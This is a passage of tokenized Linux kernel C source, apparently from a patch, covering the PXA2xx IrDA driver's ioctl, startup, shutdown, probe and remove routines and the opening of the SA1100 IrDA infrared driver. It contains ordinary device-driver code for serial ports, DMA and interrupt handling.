"struct", "if_irda_req", "*", ")", "ifreq", ";", "struct", "pxa_irda", "*", "si", "=", "netdev_priv", "(", "dev", ")", ";", "int", "ret", ";", "switch", "(", "cmd", ")", "{", "case", "SIOCSBANDWIDTH", ":", "ret", "=", "-", "EPERM", ";", "if", "(", "capable", "(", "CAP_NET_ADMIN", ")", ")", "{", "/", "*", "*", "We", "are", "unable", "to", "set", "the", "speed", "if", "the", "*", "device", "is", "not", "running", ".", "*", "/", "if", "(", "netif_running", "(", "dev", ")", ")", "{", "ret", "=", "pxa_irda_set_speed", "(", "si", ",", "rq", "-", ">", "ifr_baudrate", ")", ";", "}", "else", "{", "printk", "(", "KERN_INFO", "\"", "pxa_ir", ":", "SIOCSBANDWIDTH", ":", "!", "netif_running", "\\", "n", "\"", ");", "ret", "=", "0", ";", "}", "}", "break", ";", "case", "SIOCSMEDIABUSY", ":", "ret", "=", "-", "EPERM", ";", "if", "(", "capable", "(", "CAP_NET_ADMIN", ")", ")", "{", "irda_device_set_media_busy", "(", "dev", ",", "TRUE", ")", ";", "ret", "=", "0", ";", "}", "break", ";", "case", "SIOCGRECEIVING", ":", "ret", "=", "0", ";", "rq", "-", ">", "ifr_receiving", "=", "IS_FIR", "(", "si", ")", "?", "0", ":", "si", "-", ">", "rx_buff", ".", "state", "!", "=", "OUTSIDE_FRAME", ";", "break", ";", "default", ":", "ret", "=", "-", "EOPNOTSUPP", ";", "break", ";", "}", "return", "ret", ";", "}", "static", "void", "pxa_irda_startup", "(", "struct", "pxa_irda", "*", "si", ")", "{", "/", "*", "Disable", "STUART", "interrupts", "*", "/", "stuart_writel", "(", "si", ",", "0", ",", "STIER", ")", ";", "/", "*", "enable", "STUART", "interrupt", "to", "the", "processor", "*", "/", "stuart_writel", "(", "si", ",", "MCR_OUT2", ",", "STMCR", ")", ";", "/", "*", "configure", "SIR", "frame", "format", ":", "StartBit", "-", "Data", "7", ".", "..", "Data", "0", "-", "Stop", "Bit", "*", "/", "stuart_writel", "(", "si", ",", "LCR_WLS0", "|", "LCR_WLS1", ",", "STLCR", ")", ";", "/", "*", "enable", "FIFO", ",", "we", "use", "FIFO", "to", "improve", "performance", "*", "/", "stuart_writel", "(", "si", ",", "FCR_TRFIFOE", "|", "FCR_ITL_32", ",", "STFCR", ")", ";", "/", "*", "disable", "FICP", "*", "/", "ficp_writel", "(", "si", ",", "0", ",", "ICCR0", ")", ";", "/", "*", "configure", "FICP", "ICCR2", "*", "/", "ficp_writel", "(", "si", ",", "ICCR2_TXP", "|", "ICCR2_TRIG_32", ",", "ICCR2", ")", ";", "/", "*", "force", "SIR", "reinitialization", "*", "/", "si", "-", ">", "speed", "=", "4000000", ";", "pxa_irda_set_speed", "(", "si", ",", "9600", ")", ";", "printk", "(", "KERN_DEBUG", "\"", "pxa_ir", ":", "irda", "startup", "\\", "n", "\"", ");", "}", "static", "void", "pxa_irda_shutdown", "(", "struct", "pxa_irda", "*", "si", ")", "{", "unsigned", "long", "flags", ";", "local_irq_save", "(", "flags", ")", ";", "/", "*", "disable", "STUART", "and", "interrupt", "*", "/", "stuart_writel", "(", "si", ",", "0", ",", "STIER", ")", ";", "/", "*", "disable", "STUART", "SIR", "mode", "*", "/", "stuart_writel", "(", "si", ",", "0", ",", "STISR", ")", ";", "/", "*", "disable", "DMA", "*", "/", "dmaengine_terminate_all", "(", "si", "-", ">", "rxdma", ")", ";", "dmaengine_terminate_all", "(", "si", "-", ">", "txdma", ")", ";", "/", "*", "disable", "FICP", "*", "/", "ficp_writel", "(", "si", ",", "0", ",", "ICCR0", ")", ";", "/", "*", "disable", "the", "STUART", "or", "FICP", "clocks", "*", "/", "pxa_irda_disable_clk", "(", "si", ")", ";", "local_irq_restore", "(", "flags", ")", ";", "/", "*", "power", "off", "board", "transceiver", "*", "/", "pxa_irda_set_mode", "(", "si", ",", "IR_OFF", ")", ";", "printk", "(", "KERN_DEBUG", "\"", "pxa_ir", ":", "irda", "shutdown", "\\", "n", "\"", ");", "}", "static", "int", "pxa_irda_start", "(", "struct", "net_device", "*", "dev", ")", "{", "struct", "pxa_irda", "*", "si", "=", "netdev_priv", "(", "dev", ")", ";", "dma_cap_mask_t", "mask", ";", "struct", "dma_slave_config", "config", ";", "struct", "pxad_param", "param", ";", "int", "err", ";", "si", "-", ">", "speed", "=", "9600", ";", "err", "=", "request_irq", "(", "si", "-", ">", "uart_irq", ",", "pxa_irda_sir_irq", ",", "0", ",", "dev", "-", ">", "name", ",", "dev", ")", ";", "if", "(", "err", ")", "goto", "err_irq1", ";", "err", "=", "request_irq", "(", "si", "-", ">", "icp_irq", ",", "pxa_irda_fir_irq", ",", "0", ",", "dev", "-", ">", "name", ",", "dev", ")", ";", "if", "(", "err", ")", "goto", "err_irq2", ";", "/", "*", "*", "The", "interrupt", "must", "remain", "disabled", "for", "now", ".", "*", "/", "disable_irq", "(", "si", "-", ">", "uart_irq", ")", ";", "disable_irq", "(", "si", "-", ">", "icp_irq", ")", ";", "err", "=", "-", "EBUSY", ";", "dma_cap_zero", "(", "mask", ")", ";", "dma_cap_set", "(", "DMA_SLAVE", ",", "mask", ")", ";", "param", ".", "prio", "=", "PXAD_PRIO_LOWEST", ";", "memset", "(", "&", "config", ",", "0", ",", "sizeof", "(", "config", ")", ");", "config", ".", "src_addr_width", "=", "DMA_SLAVE_BUSWIDTH_1_BYTE", ";", "config", ".", "dst_addr_width", "=", "DMA_SLAVE_BUSWIDTH_1_BYTE", ";", "config", ".", "src_addr", "=", "(", "dma_addr_t", ")", "si", "-", ">", "irda_base", "+", "ICDR", ";", "config", ".", "dst_addr", "=", "(", "dma_addr_t", ")", "si", "-", ">", "irda_base", "+", "ICDR", ";", "config", ".", "src_maxburst", "=", "32", ";", "config", ".", "dst_maxburst", "=", "32", ";", "param", ".", "drcmr", "=", "si", "-", ">", "drcmr_rx", ";", "si", "-", ">", "rxdma", "=", "dma_request_slave_channel_compat", "(", "mask", ",", "pxad_filter_fn", ",", "&", "param", ",", "&", "dev", "-", ">", "dev", ",", "\"", "rx", "\"", ");", "if", "(", "!", "si", "-", ">", "rxdma", ")", "goto", "err_rx_dma", ";", "param", ".", "drcmr", "=", "si", "-", ">", "drcmr_tx", ";", "si", "-", ">", "txdma", "=", "dma_request_slave_channel_compat", "(", "mask", ",", "pxad_filter_fn", ",", "&", "param", ",", "&", "dev", "-", ">", "dev", ",", "\"", "tx", "\"", ");", "if", "(", "!", "si", "-", ">", "txdma", ")", "goto", "err_tx_dma", ";", "err", "=", "dmaengine_slave_config", "(", "si", "-", ">", "rxdma", ",", "&", "config", ")", ";", "if", "(", "err", ")", "goto", "err_dma_rx_buff", ";", "err", "=", "dmaengine_slave_config", "(", "si", "-", ">", "txdma", ",", "&", "config", ")", ";", "if", "(", "err", ")", "goto", "err_dma_rx_buff", ";", "err", "=", "-", "ENOMEM", ";", "si", "-", ">", "dma_rx_buff", "=", "dma_alloc_coherent", "(", "si", "-", ">", "dev", ",", "IRDA_FRAME_SIZE_LIMIT", ",", "&", "si", "-", ">", "dma_rx_buff_phy", ",", "GFP_KERNEL", ")", ";", "if", "(", "!", "si", "-", ">", "dma_rx_buff", ")", "goto", "err_dma_rx_buff", ";", "si", "-", ">", "dma_tx_buff", "=", "dma_alloc_coherent", "(", "si", "-", ">", "dev", ",", "IRDA_FRAME_SIZE_LIMIT", ",", "&", "si", "-", ">", "dma_tx_buff_phy", ",", "GFP_KERNEL", ")", ";", "if", "(", "!", "si", "-", ">", "dma_tx_buff", ")", "goto", "err_dma_tx_buff", ";", "/", "*", "Setup", "the", "serial", "port", "for", "the", "initial", "speed", ".", "*", "/", "pxa_irda_startup", "(", "si", ")", ";", "/", "*", "*", "Open", "a", "new", "IrLAP", "layer", "instance", ".", "*", "/", "si", "-", ">", "irlap", "=", "irlap_open", "(", "dev", ",", "&", "si", "-", ">", "qos", ",", "\"", "pxa", "\"", ");", "err", "=", "-", "ENOMEM", ";", "if", "(", "!", "si", "-", ">", "irlap", ")", "goto", "err_irlap", ";", "/", "*", "*", "Now", "enable", "the", "interrupt", "and", "start", "the", "queue", "*", "/", "enable_irq", "(", "si", "-", ">", "uart_irq", ")", ";", "enable_irq", "(", "si", "-", ">", "icp_irq", ")", ";", "netif_start_queue", "(", "dev", ")", ";", "printk", "(", "KERN_DEBUG", "\"", "pxa_ir", ":", "irda", "driver", "opened", "\\", "n", "\"", ");", "return", "0", ";", "err_irlap", ":", "pxa_irda_shutdown", "(", "si", ")", ";", "dma_free_coherent", "(", "si", "-", ">", "dev", ",", "IRDA_FRAME_SIZE_LIMIT", ",", "si", "-", ">", "dma_tx_buff", ",", "si", "-", ">", "dma_tx_buff_phy", ")", ";", "err_dma_tx_buff", ":", "dma_free_coherent", "(", "si", "-", ">", "dev", ",", "IRDA_FRAME_SIZE_LIMIT", ",", "si", "-", ">", "dma_rx_buff", ",", "si", "-", ">", "dma_rx_buff_phy", ")", ";", "err_dma_rx_buff", ":", "dma_release_channel", "(", "si", "-", ">", "txdma", ")", ";", "err_tx_dma", ":", "dma_release_channel", "(", "si", "-", ">", "rxdma", ")", ";", "err_rx_dma", ":", "free_irq", "(", "si", "-", ">", "icp_irq", ",", "dev", ")", ";", "err_irq2", ":", "free_irq", "(", "si", "-", ">", "uart_irq", ",", "dev", ")", ";", "err_irq1", ":", "return", "err", ";", "}", "static", "int", "pxa_irda_stop", "(", "struct", "net_device", "*", "dev", ")", "{", "struct", "pxa_irda", "*", "si", "=", "netdev_priv", "(", "dev", ")", ";", "netif_stop_queue", "(", "dev", ")", ";", "pxa_irda_shutdown", "(", "si", ")", ";", "/", "*", "Stop", "IrLAP", "*", "/", "if", "(", "si", "-", ">", "irlap", ")", "{", "irlap_close", "(", "si", "-", ">", "irlap", ")", ";", "si", "-", ">", "irlap", "=", "NULL", ";", "}", "free_irq", "(", "si", "-", ">", "uart_irq", ",", "dev", ")", ";", "free_irq", "(", "si", "-", ">", "icp_irq", ",", "dev", ")", ";", "dmaengine_terminate_all", "(", "si", "-", ">", "rxdma", ")", ";", "dmaengine_terminate_all", "(", "si", "-", ">", "txdma", ")", ";", "dma_release_channel", "(", "si", "-", ">", "rxdma", ")", ";", "dma_release_channel", "(", "si", "-", ">", "txdma", ")", ";", "if", "(", "si", "-", ">", "dma_rx_buff", ")", "dma_free_coherent", "(", "si", "-", ">", "dev", ",", "IRDA_FRAME_SIZE_LIMIT", ",", "si", "-", ">", "dma_tx_buff", ",", "si", "-", ">", "dma_tx_buff_phy", ")", ";", "if", "(", "si", "-", ">", "dma_tx_buff", ")", "dma_free_coherent", "(", "si", "-", ">", "dev", ",", "IRDA_FRAME_SIZE_LIMIT", ",", "si", "-", ">", "dma_rx_buff", ",", "si", "-", ">", "dma_rx_buff_phy", ")", ";", "printk", "(", "KERN_DEBUG", "\"", "pxa_ir", ":", "irda", "driver", "closed", "\\", "n", "\"", ");", "return", "0", ";", "}", "static", "int", "pxa_irda_suspend", "(", "struct", "platform_device", "*", "_dev", ",", "pm_message_t", "state", ")", "{", "struct", "net_device", "*", "dev", "=", "platform_get_drvdata", "(", "_dev", ")", ";", "struct", "pxa_irda", "*", "si", ";", "if", "(", "dev", "&", "&", "netif_running", "(", "dev", ")", ")", "{", "si", "=", "netdev_priv", "(", "dev", ")", ";", "netif_device_detach", "(", "dev", ")", ";", "pxa_irda_shutdown", "(", "si", ")", ";", "}", "return", "0", ";", "}", "static", "int", "pxa_irda_resume", "(", "struct", "platform_device", "*", "_dev", ")", "{", "struct", "net_device", "*", "dev", "=", "platform_get_drvdata", "(", "_dev", ")", ";", "struct", "pxa_irda", "*", "si", ";", "if", "(", "dev", "&", "&", "netif_running", "(", "dev", ")", ")", "{", "si", "=", "netdev_priv", "(", "dev", ")", ";", "pxa_irda_startup", "(", "si", ")", ";", "netif_device_attach", "(", "dev", ")", ";", "netif_wake_queue", "(", "dev", ")", ";", "}", "return", "0", ";", "}", "static", "int", "pxa_irda_init_iobuf", "(", "iobuff_t", "*", "io", ",", "int", "size", ")", "{", "io", "-", ">", "head", "=", "kmalloc", "(", "size", ",", "GFP_KERNEL", "|", "GFP_DMA", ")", ";", "if", "(", "io", "-", ">", "head", "!", "=", "NULL", ")", "{", "io", "-", ">", "truesize", "=", "size", ";", "io", "-", ">", "in_frame", "=", "FALSE", ";", "io", "-", ">", "state", "=", "OUTSIDE_FRAME", ";", "io", "-", ">", "data", "=", "io", "-", ">", "head", ";", "}", "return", "io", "-", ">", "head", "?", "0", ":", "-", "ENOMEM", ";", "}", "static", "const", "struct", "net_device_ops", "pxa_irda_netdev_ops", "=", "{", ".", "ndo_open", "=", "pxa_irda_start", ",", ".", "ndo_stop", "=", "pxa_irda_stop", ",", ".", "ndo_start_xmit", "=", "pxa_irda_hard_xmit", ",", ".", "ndo_do_ioctl", "=", "pxa_irda_ioctl", ",", "}", ";", "static", "int", "pxa_irda_probe", "(", "struct", "platform_device", "*", "pdev", ")", "{", "struct", "net_device", "*", "dev", ";", "struct", "resource", "*", "res", ";", "struct", "pxa_irda", "*", "si", ";", "void", "__iomem", "*", "ficp", ",", "*", "stuart", ";", "unsigned", "int", "baudrate_mask", ";", "int", "err", ";", "if", "(", "!", "pdev", "-", ">", "dev", ".", "platform_data", ")", "return", "-", "ENODEV", ";", "res", "=", "platform_get_resource", "(", "pdev", ",", "IORESOURCE_MEM", ",", "0", ")", ";", "ficp", "=", "devm_ioremap_resource", "(", "&", "pdev", "-", ">", "dev", ",", "res", ")", ";", "if", "(", "IS_ERR", "(", "ficp", ")", ")", "{", "dev_err", "(", "&", "pdev", "-", ">", "dev", ",", "\"", "resource", "ficp", "not", "defined", "\\", "n", "\"", ");", "return", "PTR_ERR", "(", "ficp", ")", ";", "}", "res", "=", "platform_get_resource", "(", "pdev", ",", "IORESOURCE_MEM", ",", "1", ")", ";", "stuart", "=", "devm_ioremap_resource", "(", "&", "pdev", "-", ">", "dev", ",", "res", ")", ";", "if", "(", "IS_ERR", "(", "stuart", ")", ")", "{", "dev_err", "(", "&", "pdev", "-", ">", "dev", ",", "\"", "resource", "stuart", "not", "defined", "\\", "n", "\"", ");", "return", "PTR_ERR", "(", "stuart", ")", ";", "}", "dev", "=", "alloc_irdadev", "(", "sizeof", "(", "struct", "pxa_irda", ")", ");", "if", "(", "!", "dev", ")", "{", "err", "=", "-", "ENOMEM", ";", "goto", "err_mem_1", ";", "}", "SET_NETDEV_DEV", "(", "dev", ",", "&", "pdev", "-", ">", "dev", ")", ";", "si", "=", "netdev_priv", "(", "dev", ")", ";", "si", "-", ">", "dev", "=", "&", "pdev", "-", ">", "dev", ";", "si", "-", ">", "pdata", "=", "pdev", "-", ">", "dev", ".", "platform_data", ";", "si", "-", ">", "irda_base", "=", "ficp", ";", "si", "-", ">", "stuart_base", "=", "stuart", ";", "si", "-", ">", "uart_irq", "=", "platform_get_irq", "(", "pdev", ",", "0", ")", ";", "si", "-", ">", "icp_irq", "=", "platform_get_irq", "(", "pdev", ",", "1", ")", ";", "si", "-", ">", "sir_clk", "=", "devm_clk_get", "(", "&", "pdev", "-", ">", "dev", ",", "\"", "UARTCLK", "\"", ");", "si", "-", ">", "fir_clk", "=", "devm_clk_get", "(", "&", "pdev", "-", ">", "dev", ",", "\"", "FICPCLK", "\"", ");", "if", "(", "IS_ERR", "(", "si", "-", ">", "sir_clk", ")", "|", "|", "IS_ERR", "(", "si", "-", ">", "fir_clk", ")", ")", "{", "err", "=", "PTR_ERR", "(", "IS_ERR", "(", "si", "-", ">", "sir_clk", ")", "?", "si", "-", ">", "sir_clk", ":", "si", "-", ">", "fir_clk", ")", ";", "goto", "err_mem_4", ";", "}", "res", "=", "platform_get_resource", "(", "pdev", ",", "IORESOURCE_DMA", ",", "0", ")", ";", "if", "(", "res", ")", "si", "-", ">", "drcmr_rx", "=", "res", "-", ">", "start", ";", "res", "=", "platform_get_resource", "(", "pdev", ",", "IORESOURCE_DMA", ",", "1", ")", ";", "if", "(", "res", ")", "si", "-", ">", "drcmr_tx", "=", "res", "-", ">", "start", ";", "/", "*", "*", "Initialise", "the", "SIR", "buffers", "*", "/", "err", "=", "pxa_irda_init_iobuf", "(", "&", "si", "-", ">", "rx_buff", ",", "14384", ")", ";", "if", "(", "err", ")", "goto", "err_mem_4", ";", "err", "=", "pxa_irda_init_iobuf", "(", "&", "si", "-", ">", "tx_buff", ",", "4000", ")", ";", "if", "(", "err", ")", "goto", "err_mem_5", ";", "if", "(", "gpio_is_valid", "(", "si", "-", ">", "pdata", "-", ">", "gpio_pwdown", ")", ")", "{", "err", "=", "gpio_request", "(", "si", "-", ">", "pdata", "-", ">", "gpio_pwdown", ",", "\"", "IrDA", "switch", "\"", ");", "if", "(", "err", ")", "goto", "err_startup", ";", "err", "=", "gpio_direction_output", "(", "si", "-", ">", "pdata", "-", ">", "gpio_pwdown", ",", "!", "si", "-", ">", "pdata", "-", ">", "gpio_pwdown_inverted", ")", ";", "if", "(", "err", ")", "{", "gpio_free", "(", "si", "-", ">", "pdata", "-", ">", "gpio_pwdown", ")", ";", "goto", "err_startup", ";", "}", "}", "if", "(", "si", "-", ">", "pdata", "-", ">", "startup", ")", "{", "err", "=", "si", "-", ">", "pdata", "-", ">", "startup", "(", "si", "-", ">", "dev", ")", ";", "if", "(", "err", ")", "goto", "err_startup", ";", "}", "if", "(", "gpio_is_valid", "(", "si", "-", ">", "pdata", "-", ">", "gpio_pwdown", ")", "&", "&", "si", "-", ">", "pdata", "-", ">", "startup", ")", "dev_warn", "(", "si", "-", ">", "dev", ",", "\"", "gpio_pwdown", "and", "startup", "(", ")", "both", "defined", "!", "\\", "n", "\"", ");", "dev", "-", ">", "netdev_ops", "=", "&", "pxa_irda_netdev_ops", ";", "irda_init_max_qos_capabilies", "(", "&", "si", "-", ">", "qos", ")", ";", "baudrate_mask", "=", "0", ";", "if", "(", "si", "-", ">", "pdata", "-", ">", "transceiver_cap", "&", "IR_SIRMODE", ")", "baudrate_mask", "|", "=", "IR_9600", "|", "IR_19200", "|", "IR_38400", "|", "IR_57600", "|", "IR_115200", ";", "if", "(", "si", "-", ">", "pdata", "-", ">", "transceiver_cap", "&", "IR_FIRMODE", ")", "baudrate_mask", "|", "=", "IR_4000000", "<", "<", "8", ";", "si", "-", ">", "qos", ".", "baud_rate", ".", "bits", "&", "=", "baudrate_mask", ";", "si", "-", ">", "qos", ".", "min_turn_time", ".", "bits", "=", "7", ";", "/", "*", "1ms", "or", "more", "*", "/", "irda_qos_bits_to_value", "(", "&", "si", "-", ">", "qos", ")", ";", "err", "=", "register_netdev", "(", "dev", ")", ";", "if", "(", "err", "=", "=", "0", ")", "platform_set_drvdata", "(", "pdev", ",", "dev", ")", ";", "if", "(", "err", ")", "{", "if", "(", "si", "-", ">", "pdata", "-", ">", "shutdown", ")", "si", "-", ">", "pdata", "-", ">", "shutdown", "(", "si", "-", ">", "dev", ")", ";", "err_startup", ":", "kfree", "(", "si", "-", ">", "tx_buff", ".", "head", ")", ";", "err_mem_5", ":", "kfree", "(", "si", "-", ">", "rx_buff", ".", "head", ")", ";", "err_mem_4", ":", "free_netdev", "(", "dev", ")", ";", "}", "err_mem_1", ":", "return", "err", ";", "}", "static", "int", "pxa_irda_remove", "(", "struct", "platform_device", "*", "_dev", ")", "{", "struct", "net_device", "*", "dev", "=", "platform_get_drvdata", "(", "_dev", ")", ";", "if", "(", "dev", ")", "{", "struct", "pxa_irda", "*", "si", "=", "netdev_priv", "(", "dev", ")", ";", "unregister_netdev", "(", "dev", ")", ";", "if", "(", "gpio_is_valid", "(", "si", "-", ">", "pdata", "-", ">", "gpio_pwdown", ")", ")", "gpio_free", "(", "si", "-", ">", "pdata", "-", ">", "gpio_pwdown", ")", ";", "if", "(", "si", "-", ">", "pdata", "-", ">", "shutdown", ")", "si", "-", ">", "pdata", "-", ">", "shutdown", "(", "si", "-", ">", "dev", ")", ";", "kfree", "(", "si", "-", ">", "tx_buff", ".", "head", ")", ";", "kfree", "(", "si", "-", ">", "rx_buff", ".", "head", ")", ";", "free_netdev", "(", "dev", ")", ";", "}", "return", "0", ";", "}", "static", "struct", "platform_driver", "pxa_ir_driver", "=", "{", ".", "driver", "=", "{", ".", "name", "=", "\"", "pxa2xx", "-", "ir", "\"", ",", "}", ",", ".", "probe", "=", "pxa_irda_probe", ",", ".", "remove", "=", "pxa_irda_remove", ",", ".", "suspend", "=", "pxa_irda_suspend", ",", ".", "resume", "=", "pxa_irda_resume", ",", "}", ";", "module_platform_driver", "(", "pxa_ir_driver", ")", ";", "MODULE_LICENSE", "(", "\"", "GPL", "\"", ");", "MODULE_ALIAS", "(", "\"", "platform", ":", "pxa2xx", "-", "ir", "\"", ");", "@", "@", "-", "1", ",", "1150", "+", "0", ",", "0", "@", "@", "/", "*", "*", "linux", "/", "drivers", "/", "net", "/", "irda", "/", "sa1100_ir", ".", "c", "*", "*", "Copyright", "(", "C", ")", "2000", "-", "2001", "Russell", "King", "*", "*", "This", "program", "is", "free", "software", ";", "you", "can", "redistribute", "it", "and", "/", "or", "modify", "*", "it", "under", "the", "terms", "of", "the", "GNU", "General", "Public", "License", "version", "2", "as", "*", "published", "by", "the", "Free", "Software", "Foundation", ".", "*", "*", "Infra", "-", "red", "driver", "for", "the", "StrongARM", "SA1100", "embedded", "microprocessor", "*", "*", "Note", "that", "we", "don", "'", "t", "have", "to", "worry", "about", "the", "SA1111", "'", "s", "DMA", "bugs", "in", "here", ",", "*", "so", "we", "use", "the", "straight", "forward", "dma_map_", "*", "functions", "with", "a", "null", "pointer", ".", "*", "*", "This", "driver", "takes", "one", "kernel", "command", "line", "parameter", ",", "sa1100ir", "=", ",", "with", "*", "the", "following", "options", ":", "*", "max_rate", ":", "baudrate", "-", "set", "the", "maximum", "baud", "rate", "*", "power_level", ":", "level", "-", "set", "the", "transmitter", "power", "level", "*", "tx_lpm", ":", "0", "|", "1", "-", "set", "transmit", "low", "power", "mode", "*", "/", "#", "include", "<", "linux", "/", "module", ".", "h", ">", "#", "include", "<", "linux", "/", "moduleparam", ".", "h", ">", "#", "include", "<", "linux", "/", "types", ".", "h", ">", "#", "include", "<", "linux", "/", "init", ".", "h", ">", "#", "include", "<", "linux", "/", "errno", ".", "h", ">", "#", "include", "<", "linux", "/", "netdevice", ".", "h", ">", "#", "include", "<", "linux", "/", "slab", ".", "h", ">", "#", "include", "<", "linux", "/", "rtnetlink", ".", "h", ">", "#", "include", "<", "linux", "/", "interrupt", ".", "h", ">", "#", "include", "<", "linux", "/", "delay", ".", "h", ">", "#", "include", "<", "linux", "/", "platform_device", ".", "h", ">", "#", "include", "<", "linux", "/", "dma", "-", "mapping", ".", "h", ">", "#", "include", "<", "linux", "/", "dmaengine", ".", "h", ">", "#", "include", "<", "linux", "/", "sa11x0", "-", "dma", ".", "h", ">", "#", "include", "<", "net", "/", "irda", "/", "irda", ".", "h", ">", "#", "include", "<", "net", "/", "irda", "/", "wrapper", ".", "h", ">", "#", "include", "<", "net", "/", "irda", "/", "irda_device", ".", "h", ">", "#", "include", "<", "mach", "/", "hardware", ".", "h", ">", "#", "include", "<", "linux", "/", "platform_data", "/", "irda", "-", "sa11x0", ".", "h", ">", "static", "int", "power_level", "=", "3", ";", "static", "int", "tx_lpm", ";", "static", "int", "max_rate", "=", "4000000", ";", "struct", "sa1100_buf", "{", "struct", "device", "*", "dev", ";", "struct", "sk_buff", "*", "skb", ";", "struct", "scatterlist", "sg", ";", "struct", "dma_chan", "*", "chan", ";", "dma_cookie_t", "cookie", ";", "}", ";", "struct", "sa1100_irda", "{", "unsigned", "char", "utcr4", ";", "unsigned", "char", "power", ";", "unsigned", "char", "open", ";", "int", "speed", ";", "int", "newspeed", ";", "struct", "sa1100_buf", "dma_rx", ";", "struct", "sa1100_buf", "dma_tx", ";", "struct", "device", "*", "dev", ";", "struct", "irda_platform_data", "*", "pdata", ";", "struct", "irlap_cb", "*", "irlap", ";", "struct", "qos_info", "qos", ";", "iobuff_t", "tx_buff", ";", "iobuff_t", "rx_buff", ";", "int", "(", "*", "tx_start", ")", "(", "struct", "sk_buff", "*", ",", "struct", "net_device", "*", ",", "struct", "sa1100_irda", "*", ");", "irqreturn_t", "(", "*", "irq", ")", "(", "struct", "net_device", "*", ",", "struct", "sa1100_irda", "*", ");", "}", ";", "static", "int", "sa1100_irda_set_speed", "(", "struct", "sa1100_irda", "*", ",", "int", ")", ";", "#", "define", "IS_FIR", "(", "si", ")", "(", "(", "si", ")", "->", "speed", ">", "=", "4000000", ")", "#", "define", "HPSIR_MAX_RXLEN", "2047", "static", "struct", "dma_slave_config", "sa1100_irda_sir_tx", "=", "{", ".", "direction", "=", "DMA_TO_DEVICE", ",", ".", "dst_addr", "=", "__PREG", "(", "Ser2UTDR", ")", ",", ".", "dst_addr_width", "=", "DMA_SLAVE_BUSWIDTH_1_BYTE", ",", ".", "dst_maxburst", "=", "4", ",", "}", ";", "static", "struct", "dma_slave_config", "sa1100_irda_fir_rx", "=", "{", ".", "direction", "=", "DMA_FROM_DEVICE", ",", ".", "src_addr", "=", "__PREG", "(", "Ser2HSDR", ")", ",", ".", "src_addr_width", "=", "DMA_SLAVE_BUSWIDTH_1_BYTE", ",", ".", "src_maxburst", "=", "8", ",", "}", ";", "static", "struct", "dma_slave_config", "sa1100_irda_fir_tx", "=", "{", ".", "direction", "=", "DMA_TO_DEVICE", ",", ".", "dst_addr", "=", "__PREG", "(", "Ser2HSDR", ")", ",", ".", "dst_addr_width", "=", "DMA_SLAVE_BUSWIDTH_1_BYTE", ",", ".", "dst_maxburst", "=", "8", ",", "}", ";", "static", "unsigned", "sa1100_irda_dma_xferred", "(", "struct", "sa1100_buf", "*", "buf", ")", "{", "struct", "dma_chan", "*", "chan", "=", "buf", "-", ">", "chan", ";", "struct", "dma_tx_state", "state", ";", "enum", "dma_status", "status", ";", "status", "=", "chan", "-", ">", "device", "-", ">", "device_tx_status", "(", "chan", ",", "buf", "-", ">", "cookie", ",", "&", "state", ")", ";", "if", "(", "status", "!", "=", "DMA_PAUSED", ")", "return", "0", ";", "return", "sg_dma_len", "(", "&", "buf", "-", ">", "sg", ")", "-", "state", ".", "residue", ";", "}", "static", "int", "sa1100_irda_dma_request", "(", "struct", "device", "*", "dev", ",", "struct", "sa1100_buf", "*", "buf", ",", "const", "char", "*", "name", ",", "struct", "dma_slave_config", "*", "cfg", ")", "{", "dma_cap_mask_t", "m", ";", "int", "ret", ";", "dma_cap_zero", "(", "m", ")", ";", "dma_cap_set", "(", "DMA_SLAVE", ",", "m", ")", ";", "buf", "-", ">", "chan", "=", "dma_request_channel", "(", "m", ",", "sa11x0_dma_filter_fn", ",", "(", "void", "*", ")", "name", ")", ";", "if", "(", "!", "buf", "-", ">", "chan", ")", "{", "dev_err", "(", "dev", ",", "\"", "unable", "to", "request", "DMA", "channel", "for", "%", "s", "\\", "n", "\"", ",", "name", ")", ";", "return", "-", "ENOENT", ";", "}", "ret", "=", "dmaengine_slave_config", "(", "buf", "-", ">", "chan", ",", "cfg", ")", ";", "if", "(", "ret", ")", "dev_warn", "(", "dev", ",", "\"", "DMA", "slave_config", "for", "%", "s", "returned", "%", "d", "\\", "n", "\"", ",", "name", ",", "ret", ")", ";", "buf", "-", ">", "dev", "=", "buf", "-", ">", "chan", "-", ">", "device", "-", ">", "dev", ";", "return", "0", ";", "}", "static", "void", "sa1100_irda_dma_start", "(", "struct", "sa1100_buf", "*", "buf", ",", "enum", "dma_transfer_direction", "dir", ",", "dma_async_tx_callback", "cb", ",", "void", "*", "cb_p", ")", "{", "struct", "dma_async_tx_descriptor", "*", "desc", ";", "struct", "dma_chan", "*", "chan", "=", "buf", "-", ">", "chan", ";", "desc", "=", "dmaengine_prep_slave_sg", "(", "chan", ",", "&", "buf", "-", ">", "sg", ",", "1", ",", "dir", ",", "DMA_PREP_INTERRUPT", "|", "DMA_CTRL_ACK", ")", ";", "if", "(", "desc", ")", "{", "desc", "-", ">", "callback", "=", "cb", ";", "desc", "-", ">", "callback_param", "=", "cb_p", ";", "buf", "-", ">", "cookie", "=", "dmaengine_submit", "(", "desc", ")", ";", "dma_async_issue_pending", "(", "chan", ")", ";", "}", "}", "/", "*", "*", "Allocate", "and", "map", "the", "receive", "buffer", ",", "unless", "it", "is", "already", "allocated", ".", "*", "/", "static", "int", "sa1100_irda_rx_alloc", "(", "struct", "sa1100_irda", "*", "si", ")", "{", "if", "(", "si", "-", ">", "dma_rx", ".", "skb", ")", "return", "0", ";", "si", "-", ">", "dma_rx", ".", "skb", "=", "alloc_skb", "(", "HPSIR_MAX_RXLEN", "+", "1", ",", "GFP_ATOMIC", ")", ";", "if", "(", "!", "si", "-", ">", "dma_rx", ".", "skb", ")", "{", "printk", "(", "KERN_ERR", "\"", "sa1100_ir", ":", "out", "of", "memory", "for", "RX", "SKB", "\\", "n", "\"", ");", "return", "-", "ENOMEM", ";", "}", "/", "*", "*", "Align", "any", "IP", "headers", "that", "may", "be", "contained", "*", "within", "the", "frame", ".", "*", "/", "skb_reserve", "(", "si", "-", ">", "dma_rx", ".", "skb", ",", "1", ")", ";", "sg_set_buf", "(", "&", "si", "-", ">", "dma_rx", ".", "sg", ",", "si", "-", ">", "dma_rx", ".", "skb", "-", ">", "data", ",", "HPSIR_MAX_RXLEN", ")", ";", "if", "(", "dma_map_sg", "(", "si", "-", ">", "dma_rx", ".", "dev", ",", "&", "si", "-", ">", "dma_rx", ".", "sg", ",", "1", ",", "DMA_FROM_DEVICE", ")", "=", "=", "0", ")", "{", "dev_kfree_skb_any", "(", "si", "-", ">", "dma_rx", ".", "skb", ")", ";", "return", "-", "ENOMEM", ";", "}", "return", "0", ";", "}", "/", "*", "*", "We", "want", "to", "get", "here", "as", "soon", "as", 